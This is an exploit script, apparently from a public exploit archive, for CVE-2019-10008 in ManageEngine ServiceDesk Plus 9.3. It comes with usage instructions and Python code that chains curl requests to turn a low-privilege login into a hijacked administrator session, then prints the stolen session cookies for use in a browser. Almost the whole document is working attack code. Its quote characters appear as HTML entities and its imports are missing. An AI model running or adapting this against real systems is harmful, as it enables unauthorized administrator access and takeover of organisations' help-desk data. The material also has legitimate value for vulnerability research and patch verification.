
# Exploit Title: Manage Engine ServiceDesk Plus Version 9.3 Privileged Account Hijacking
# Exploit Author: Ata Hakçıl, Melih Kaan Yıldız
# Vendor: ManageEngine
# Vendor Homepage: www.manageengine.com
# Product: Service Desk Plus
# Version: 9.3
# Tested On: Windows 10 64 bit
# CVE : 2019-10008


# How to use: Change the host, low_username, low_password and high_username variables depending on what you have.
# Low username and password is an account you have access to. high_username is account you want to authenticate as.

# After running the script, it will output you the cookies that you can set on your browser to login to the high_username without password.
# Run this script on a Linux OS.

#Host ip address + port
host="localhost:8080"

#set to https if needed
url = "http://" + host

#Username with credentials you have
low_username="guest"
low_password="guest"

#username you want to login as
high_username="administrator"





print("\033[1;37mUrl: \033[1;32m" + url)
print("\033[1;37mUser with low priv: \033[1;32m" + low_username + &#039;:&#039; + low_password)
print("\033[1;37mUser to bypass authentication to: \033[1;32m" + high_username)


print("\033[1;32mGetting a session id\033[1;37m")

# Get index page to capture a session id
curl = "curl -i -s -k  -X $&#039;GET&#039; \
    -H $&#039;Host: "+host+"&#039;  -H $&#039;Referer: "+url+"/&#039; -H $&#039;Connection: close&#039;\
    $&#039;"+url+"/&#039;"

out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()
sessid = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]

print("Sessid:")
print(sessid)


print("\033[1;31mLogging in with low privilege user\033[1;37m")


#Attempt login post request 
curl="curl -i -s -k -X $&#039;POST&#039; -H $&#039;Host: "+host+"&#039;\
 -H $&#039;Referer: "+url+"/&#039;\
 -H $&#039;Connection: close&#039; -H $&#039;Cookie: JSESSIONID="+sessid+"&#039; \
 -b $&#039;JSESSIONID="+sessid+"&#039; \
 --data-binary $&#039;j_username="+low_username+"&j_password="+low_password+"&LDAPEnable=false&\
 hidden=Select+a+Domain&hidden=For+Domain&AdEnable=false&DomainCount=0&LocalAuth=No&LocalAuthWithDomain=No&\
 dynamicUserAddition_status=true&localAuthEnable=true&logonDomainName=-1&loginButton=Login&checkbox=checkbox&#039; \
 $&#039;"+url+"/j_security_check&#039;"

out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()


#Instead of following redirects with -L, following manually because we don&#039;t need all the transactions.
curl="curl -i -s -k -X $&#039;GET&#039; -H $&#039;Host: "+host+"&#039;\
 -H $&#039;Referer: "+url+"/&#039;\
 -H $&#039;Connection: close&#039; -H $&#039;Cookie: JSESSIONID="+sessid+"&#039; \
 -b $&#039;JSESSIONID="+sessid+"&#039; \
 $&#039;"+url+"/&#039;"

out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()

print("\033[1;32mCaptured authenticated cookies.\033[1;37m")
sessid = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
print(sessid)
sessidsso = re.findall("(?<=Set-Cookie: JSESSIONIDSSO=)[^;]*",out)[0]
print(sessidsso)
grbl = re.findall("(?<=Set-Cookie: )[^=]*=[^;]*",out)

grbl2 = []
for cookie in grbl:
	cl = cookie.split(&#039;=&#039;)
	if cl[0]!=&#039;JSESSIONID&#039; and cl[0]!=&#039;JSESSIONIDSSO&#039; and cl[0]!=&#039;_rem&#039;:

		grbl2.append(cl[0])
		grbl2.append(cl[1])

curl = "curl -i -s -k -X $&#039;GET&#039; \
    -H $&#039;Host: "+host+"&#039; \
    -H $&#039;Cookie: JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    -b $&#039;JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    $&#039;"+url+"/mc/&#039;"


out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()
sessid2 = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]

print("\033[1;32mCaptured secondary sessid.\033[1;37m")
print(sessid2)


print("\033[1;31mDoing the magic step 1.\033[1;37m")
curl = "curl -i -s -k -X $&#039;GET&#039; \
    -H $&#039;Host: "+host+"&#039; \
	-H $&#039;Referer: "+url+"/mc/WOListView.do&#039; \
	-H $&#039;Cookie: JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
	-b $&#039;JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
	$&#039;"+url+"/mc/jsp/MCLogOut.jsp&#039;"

out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()

print("\033[1;31mDoing the magic step 2.\033[1;37m")




curl = "curl -i -s -k -X $&#039;GET&#039; \
    -H $&#039;Host: "+host+"&#039; \
    -H $&#039;Cookie: JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    -b $&#039;JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    $&#039;"+url+"/mc/jsp/MCDashboard.jsp&#039;"


out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()

sessid3 = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
sessidsso = re.findall("(?<=Set-Cookie: JSESSIONIDSSO=)[^;]*",out)[0]


curl = "curl -i -s -k -X $&#039;GET&#039; \
    -H $&#039;Host: "+host+"&#039; \
    -H $&#039;Cookie: JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    -b $&#039;JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    $&#039;"+url+"/&#039;"

out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()
sessid4 = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]


curl = "curl -i -s -k -X $&#039;POST&#039; \
    -H $&#039;"+host+"&#039; \
    -H $&#039;Referer: "+url+"/mc/jsp/MCDashboard.jsp&#039; \
    -H $&#039;Cookie: JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    -b $&#039;JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    --data-binary $&#039;j_username="+high_username+"&j_password=bypassingpass&DOMAIN_NAME=&#039; \
    $&#039;"+url+"/mc/j_security_check&#039;"


out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()

curl = "curl -i -s -k -X $&#039;GET&#039; \
    -H $&#039;Host: "+host+"&#039; \
    -H $&#039;Referer: "+url+"/mc/jsp/MCDashboard.jsp&#039; \
    -H $&#039;Cookie: JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    -H $&#039;Upgrade-Insecure-Requests: 1&#039; \
    -b $&#039;JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"&#039; \
    $&#039;"+url+"/mc/jsp/MCDashboard.jsp&#039;"



out = os.popen(&#039;/bin/bash -c "&#039; + curl+&#039;"&#039;).read()


sessidhigh = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
sessidssohigh = re.findall("(?<=Set-Cookie: JSESSIONIDSSO=)[^;]*",out)[0]

print("\033[1;31mCaptured target session.Set following cookies on your browser.\033[1;37m")
print("JSESSIONID=" + sessidhigh)
print("JSESSIONIDSSO=" + sessidssohigh)
print(grbl2[0] + "=" + grbl2[1])
print(grbl2[2] + "=" + grbl2[3])
print("_rem=true")

